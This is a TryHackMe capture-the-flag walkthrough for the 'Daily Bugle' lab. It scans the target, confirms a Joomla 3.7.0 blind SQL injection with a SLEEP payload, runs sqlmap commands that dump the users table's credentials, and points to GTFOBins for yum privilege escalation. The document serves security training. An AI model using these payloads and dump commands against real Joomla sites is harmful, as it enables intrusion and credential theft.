# The Daily Bugle

| [![Jenkins](../../_static/images/skynet.png)](https://tryhackme.com/room/dailybugle) |
|:--:|
| [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/dailybugle) |

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage 
of yum. 

## Obtain user and root 

### Scanning

Run a simple port scan (without Ping)

	# nmap -Pn -p- <IP address target machine> -oN portscan

portscan:

```text

```

Run an `-A` scan on the open ports:

	# nmap -Pn -T4 -A -p22,80,3306 <IP address target machine> -oN servicescan

servicescan:

```text

```

### Exploring


    # searchsploit joomla 3.7.0

Mirroring:

    # searchsploit -m php/webapps/42033.txt

Apparently, this version of Joomla is affected by a blind SQL injection in the `list[fullordering]` parameter.

In browser, run the payloaod provided by SQLMap to confirm the endpoint is vulnerable:

    http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)

### Gaining a foothold

Run SQLMap using the arguments specified in the exploit:

    sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

The [users table](https://docs.joomla.org/Tables/users) may contain credentials to access the Joomla administration 
section.

Dump the username and password columns from the `users` table:

    sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C username,password -p list[fullordering] --dump

### Privilege escalation

Yum is a free and open-source command-line package-management utility for Linux-based operating system which uses the RPM Package Manager.

According to [GTFOBins yum](https://gtfobins.github.io/gtfobins/yum/), yum can be used to escalate privileges by 
crafting an RPM package and installing it on the victim machine. Follow the steps given.